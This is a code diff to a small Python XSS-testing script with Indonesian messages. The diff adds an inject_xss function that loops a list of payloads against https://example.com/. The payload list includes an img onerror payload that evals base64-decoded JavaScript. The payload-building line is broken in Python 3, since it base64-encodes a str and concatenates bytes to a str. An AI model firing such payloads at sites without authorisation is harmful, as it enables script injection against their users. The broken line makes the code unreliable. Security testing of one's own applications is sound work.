@@ -16,6 +16,11 @@ def test_xss(url, payload):
     else:
         print("Kerentanan XSS tidak ditemukan di URL:", url)
 
+def inject_xss(url, payloads):
+    for payload in payloads:
+        print("Menguji URL:", url, "dengan payload:", payload)
+        test_xss(url, payload)
+
 if __name__ == "__main__":
     url = "https://example.com/"
     payloads = [
@@ -28,5 +33,5 @@ if __name__ == "__main__":
         "<img src='/xss.png' onerror='eval(atob(" + base64.b64encode("document.location.href") + "))'>",
     ]
 
-    for payload in payloads:
-        test_xss(url, payload)
+    inject_xss(url, payloads)
+    
